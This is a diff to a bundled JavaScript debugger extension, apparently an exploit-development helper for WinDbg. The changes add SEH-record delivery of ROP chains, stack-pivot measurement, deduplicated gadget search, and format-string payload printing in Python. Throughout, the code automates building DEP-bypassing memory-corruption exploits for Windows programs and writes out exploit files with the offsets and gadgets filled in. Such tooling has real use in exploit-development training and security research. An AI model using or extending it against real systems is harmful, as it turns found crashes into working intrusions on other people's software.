+      how: `${hex325(handler)} written over the handler, bp on it, g; then the handler, the SEH head and the registers put back`,
+      reproduce: `ed ${hex325(slot)} ${hex325(handler)} ; bp ${hex325(handler)} ; g ; ? ${hex325(crash.record)} - esp`
     };
   }
 
@@ -20450,17 +20579,17 @@ ${SC_BUILDER_SOURCE.slice(end)}` };
         );
         section("Address block");
         for (let i = 0; i < result3.addressDwords.length; i += 1) {
-          const dword = result3.addressDwords[i];
+          const dword2 = result3.addressDwords[i];
           const bytes = result3.addressBlock.slice(i * 4, i * 4 + 4).map(hexByte2).join(" ");
-          print(`  ${bytes}    ; slot ${i} -> %${argIndex + i}$  (0x${dword.toString(16).toUpperCase().padStart(8, "0")})`);
+          print(`  ${bytes}    ; slot ${i} -> %${argIndex + i}$  (0x${dword2.toString(16).toUpperCase().padStart(8, "0")})`);
         }
         section("Format string");
         print(result3.formatString);
         section("Python");
         print("def p32(v): return struct.pack('<I', v)");
         print("payload = (");
-        for (const dword of result3.addressDwords) {
-          print(`    p32(0x${dword.toString(16).toUpperCase().padStart(8, "0")}) +`);
+        for (const dword2 of result3.addressDwords) {
+          print(`    p32(0x${dword2.toString(16).toUpperCase().padStart(8, "0")}) +`);
         }
         const fmtBytes = [...result3.formatString].map((ch) => ch.charCodeAt(0));
         const fmtLiteral = isPrintableAscii(fmtBytes) ? `b"${result3.formatString.replace(/"/g, '\\"')}"` : toPythonBytes(fmtBytes);
@@ -27186,14 +27315,14 @@ ${INDENT}`)]);
       const known2 = new Set(((_a2 = scanned == null ? void 0 : scanned.gadgets) != null ? _a2 : []).map((gadget) => gadgetAddress(gadget)));
       const hits = [];
       const found = [];
-      const dirty = encodings.map(() => 0);
+      const dirty = encodings.map(() => /* @__PURE__ */ new Set());
       for (const module of modules) {
         const search = findEncodings(module, encodings, (address) => clean2.predicate({ address }), 8);
-        search.dirty.forEach((count, i) => {
-          dirty[i] += count;
+        search.dirty.forEach((addresses, i) => {
+          for (const address of addresses) dirty[i].add(address);
         });
         for (const hit of search.hits) {
-          found.push({ encoding: hit.encoding, address: Number(hit.address) });
+          found.push({ encoding: hit.encoding, address: Number(hit.address), sequence: hit.mnemonic });
           if (!known2.has(Number(hit.address))) hits.push({ mnemonic: hit.mnemonic, address: hit.address, module });
         }
       }
@@ -27201,8 +27330,11 @@ ${INDENT}`)]);
       return {
         corpus,
         groups: owners.map((mine) => ({
-          clean: found.filter((hit) => mine.indexOf(hit.encoding) >= 0).map((hit) => hit.address),
-          dirty: mine.reduce((sum, index) => sum + dirty[index], 0)
+          // A body + ret and the same body + one wildcard + ret both match where the wildcard is itself a
+          // ret, so the same address arrives under two encodings. The shortest span is the gadget, so the
+          // first hit at an address wins and the rest are dropped.
+          clean: found.filter((hit) => mine.indexOf(hit.encoding) >= 0).filter((hit, i, all) => all.findIndex((other) => other.address === hit.address) === i).map((hit) => ({ address: hit.address, sequence: hit.sequence })),
+          dirty: new Set(mine.flatMap((index) => [...dirty[index]])).size
         }))
       };
     };
@@ -27310,7 +27442,13 @@ ${INDENT}`)]);
       }
       const missing = plans.filter((plan) => !met(plan));
       const where = modules.map(moduleLabel2).join(", ");
-      if (missing.length > 0) warn(`No gadget in ${where} for: ${titles(missing)}. Each was searched for in every byte of it, so this is the module, not the scan.`);
+      if (missing.length > 0) {
+        const anyHit = missing.some((plan) => {
+          var _a3, _b2;
+          return ((_b2 = (_a3 = solved.settled[plan.job.key]) == null ? void 0 : _a3.clean.length) != null ? _b2 : 0) > 0;
+        });
+        warn(`No gadget in ${where} for: ${titles(missing)}. Each was searched for in every byte of it, ${anyHit ? "and where a hit is listed above, the module has one the chain cannot use, not none." : "so this is the module, not the scan."}`);
+      }
       const other = otherStyle(solved, style);
       const blocking = missing.filter((plan) => !neededBy(plan.job, other, api2));
       if (blocking.length > 0) {
@@ -27434,6 +27572,40 @@ ${INDENT}`)]);
       });
       return toDxResult("Gadget Palette", rows);
     };
+    const takesHandlers = (address) => {
+      const module = findModuleByAddress(BigInt(address));
+      return module !== void 0 && takesSehHandler(module).ok;
+    };
+    const sehDelivery = (crash, corpus) => {
+      var _a2;
+      const candidates2 = handlerCandidates((_a2 = corpus == null ? void 0 : corpus.gadgets) != null ? _a2 : [], takesHandlers);
+      const { tail, how: tailHow } = measureTail(crash.record, readByte);
+      const base = { kind: "seh", record: crash.record, handler: crash.handler, tail, tailHow };
+      if (candidates2.length === 0) return __spreadProps(__spreadValues({}, base), { how: "not measured: no gadget in a module without SafeSEH can stand in as the handler", pivots: [] });
+      const measured = measureHandlerEsp(crash, candidates2[0].address);
+      if (measured.esp === void 0) return __spreadProps(__spreadValues({}, base), { how: measured.how, pivots: [] });
+      const sehEsp = crash.record - measured.esp >>> 0;
+      return __spreadProps(__spreadValues({}, base), { sehEsp, how: measured.how, reproduce: measured.reproduce, handlerEsp: measured.esp, pivots: landingPivots(candidates2, sehEsp, crash.esp - measured.esp >>> 0) });
+    };
+    const printSehDelivery = (delivery, crash, taken, lead, style) => {
+      info(`${taken ? "Delivered through the SEH record, not a saved EIP" : "The overflow reached an SEH record as well"}: EIP ${hex325(crash.eip)} is in ${crash.eipModule}, and the first record, at ${hex325(delivery.record)}, holds handler ${hex325(delivery.handler)}, which is in no module (!exchain).`);
+      const page = memoryRegion(BigInt(delivery.record));
+      info(`Not pop pop ret: it returns into the record itself, ${page.executable === false ? "on a page that does not execute" : "on the stack"} (!vprot ${hex325(delivery.record)}). The handler moves ESP into the buffer instead.`);
+      const { handlerEsp } = delivery;
+      if (delivery.sehEsp === void 0 || handlerEsp === void 0) warn(`ESP when the handler runs: ${delivery.how}. SEH_ESP is a hole.`);
+      else {
+        info(`ESP when the handler runs: ${hex325(handlerEsp)}, the record 0x${delivery.sehEsp.toString(16).toUpperCase()} above it. Measured: ${delivery.how}.`);
+        info(`Reproduce: ${delivery.reproduce}`);
+        if (delivery.pivots.length === 0) warn(`No handler lands between the faulting ESP ${hex325(crash.esp)} and the record, so the chain goes on the saved EIP instead. If this target's function never returns, the missing piece is one gadget that adds between 0x${(crash.esp - handlerEsp >>> 0).toString(16).toUpperCase()} and 0x${delivery.sehEsp.toString(16).toUpperCase()} to ESP and returns: dx @$osed().rop.pivots()`);
+        for (const pivot of delivery.pivots.slice(0, 3)) {
+          const drop = delivery.sehEsp - pivot.land;
+          info(`  ${hex325(pivot.address)}  ${pivot.sequence}: lands at OFFSET - 0x${drop.toString(16).toUpperCase()}, so it needs OFFSET >= 0x${(drop + lead).toString(16).toUpperCase()}`);
+        }
+        if (delivery.pivots.length > 3) info(`  ${delivery.pivots.length - 3} more in SEH_PIVOTS below`);
+        if (taken) info(`seh_pivot takes the lowest landing that still leaves the ${lead} byte(s) of buffer the ${style} style keeps below the chain, and stops the file if none does.`);
+      }
+      output_exports[delivery.tail === void 0 ? "warn" : "info"](`Past the handler: ${delivery.tailHow}.`);
+    };
     const executeDepPlan = (...args) => {
       var _a2, _b, _c, _d, _e, _f, _g, _h, _i, _j, _k;
       if (args.length === 1 && args[0] === "help") {
@@ -27515,6 +27687,7 @@ ${INDENT}`)]);
       const frameFacts = { iatSlot, slotWritable: slotWritable(iatSlot), delta: (_d = route == null ? void 0 : route.delta) == null ? void 0 : _d.value, writable, cave, caveBytes };
       const solved = moduleFailed || !buildsChain ? void 0 : solveStyles(scanned, modules, badchars, exclude, depApi, frameFacts, stagingFor);
       const staging = solved == null ? void 0 : solved.staging;
+      const sehCrash = solved ? sehAtCrash() : void 0;
       const style = styleText === "auto" || styleText === "none" ? solved ? chooseStyle(solved) : "skeleton" : styleText;
       const noChain = dep.enforced === false && !anyway;
       section(dxCall("dep_plan", callArgs(solved ? style : noChain ? "none" : styleText, anyway)));
@@ -27663,6 +27836,8 @@ ${INDENT}`)]);
         const bytes = tryReadMemory(BigInt(address), 4);
         return bytes && bytes.length === 4 ? (bytes[0] | bytes[1] << 8 | bytes[2] << 16 | bytes[3] << 24) >>> 0 : void 0;
       });
+      const seh = sehCrash && solved ? sehDelivery(sehCrash, corpus) : void 0;
+      const delivery = seh && seh.pivots.length > 0 ? seh : { kind: "ret" };
       const build = buildExploit({
         api: depApi,
         style,
@@ -27680,7 +27855,8 @@ ${INDENT}`)]);
         jmpEsp,
         stage,
         exclude,
-        landing: landing2
+        landing: landing2,
+        delivery
       });
       if (solved) printBlock(build.blocks[4]);
       summary.push({ Section: `[4/${n}] candidates`, Result: !solved ? "skipped" : missing.length === 0 ? "every job has one" : `missing ${missing.length}` });
@@ -27730,8 +27906,11 @@ ${INDENT}`)]);
           info(`${hex325((_i = roomBelow()) != null ? _i : 0)} bytes of that run sit below the frame, and that is the stack ${depApi} gets: it pushes down from here. The frame is laid as high in the run as its own field addresses allow, for exactly this reason.`);
           warn("A run of zero, int3 or nop bytes in a writable section. Nothing here proves the program never writes there.");
         } else if (style === "staged") for (const line of (_j = solved == null ? void 0 : solved.unavailable) != null ? _j : []) warn(line);
-        output_exports[landing2.measured ? "info" : "warn"](`ESP after the crashing ret: ${landing2.how}.`);
-        output_exports[landing2.measured ? "info" : "warn"](!landing2.measured ? "Run dep_plan at the crash, or find the EIP dword with dds esp-10 L8 and set RET_GAP." : landing2.gap === 0 ? "The chain's second dword sits right after EIP." : `The chain's second dword sits at OFFSET + ${4 + landing2.gap}: RET_GAP puts ${landing2.gap} junk bytes after the first gadget.`);
+        if (seh) printSehDelivery(seh, sehCrash, delivery.kind === "seh", style === "skeleton" ? 4 * FRAMES[depApi].length : 0, style);
+        if (delivery.kind !== "seh") {
+          output_exports[landing2.measured ? "info" : "warn"](`ESP after the crashing ret: ${landing2.how}.`);
+          output_exports[landing2.measured ? "info" : "warn"](!landing2.measured ? "Run dep_plan at the crash, or find the EIP dword with dds esp-10 L8 and set RET_GAP." : landing2.gap === 0 ? "The chain's second dword sits right after EIP." : `The chain's second dword sits at OFFSET + ${4 + landing2.gap}: RET_GAP puts ${landing2.gap} junk bytes after the first gadget.`);
+        }
         printBlock(build.blocks[6]);
       }
       summary.push({ Section: `[6/${n}] frame`, Result: blocker ? "skipped" : style === "pushad" ? "register map" : style === "staged" ? `staged at ${staging === void 0 ? "nowhere" : hex325(staging)}` : "dep_function frame" });
@@ -27748,8 +27927,11 @@ ${INDENT}`)]);
       }
       summary.push({ Section: `[7/${n}] exploit`, Result: blocker ? "skipped" : build.holes.length === 0 ? "no holes" : `${build.holes.length} hole(s)` });
       if (!blocker && solved && missing.length > 0 && solved.styles.every((name) => solved.plans[name].some((plan) => !met(plan)))) {
-        const lacks = (name) => `the ${name} style lacks ${titles(solved.plans[name].filter((plan) => !met(plan)))}`;
-        blocker = { layer: "method", what: `no style has a gadget for every job in ${modulesLabel}: ${solved.styles.map(lacks).join("; ")}. Each was searched for in every byte of it.`, next: solved.unavailable };
+        const unmet2 = (name) => solved.plans[name].filter((plan) => !met(plan));
+        const lacks = (name) => `the ${name} style lacks ${titles(unmet2(name))}`;
+        const ordered = [...solved.styles].sort((a, b) => unmet2(a).length - unmet2(b).length);
+        const rest = ordered.slice(1).map(lacks);
+        blocker = { layer: "method", what: `${modulesLabel} is ${unmet2(ordered[0]).length} job(s) short of the ${ordered[0]} style, the closest of the ${ordered.length}: ${titles(unmet2(ordered[0]))}${rest.length > 0 ? `. Behind it, ${rest.join("; ")}` : ""}. Each was searched for in every byte of it, and [4/7] names every hit the search found for each.`, next: solved.unavailable };
       }
       const ending = blocker;
       if (ending) {
@@ -27761,7 +27943,7 @@ ${INDENT}`)]);
         warn(`No complete ${depApi} chain in the ${style} style: ${modulesLabel} has no gadget for ${missing.join(", ")}, so [7/7] holds a hole for each. The ${other} style has a gadget for every job: ${dxCall("dep_plan", [depApi, modulesArg, badText, other, stage, ...excludeText || anyway ? [excludeText] : [], ...anyway ? [true] : []])}`);
       } else {
         section("Verdict");
-        info(`A ${depApi} chain from ${modulesLabel} in the ${style} style${(route == null ? void 0 : route.delta) ? `, the API reached from ${route.delta.dll}!${route.delta.anchor} by a distance measured on this machine` : ""}${build.holes.length > 0 ? `, with ${build.holes.length} hole(s) to fill` : ""}.`);
+        info(`A ${depApi} chain from ${modulesLabel} in the ${style} style${delivery.kind === "seh" ? ", delivered through the SEH handler" : ""}${(route == null ? void 0 : route.delta) ? `, the API reached from ${route.delta.dll}!${route.delta.anchor} by a distance measured on this machine` : ""}${build.holes.length > 0 ? `, with ${build.holes.length} hole(s) to fill` : ""}.`);
         info(`The same run with every choice written out: ${dxCall("dep_plan", callArgs(style, anyway))}`);
       }
       setResult({
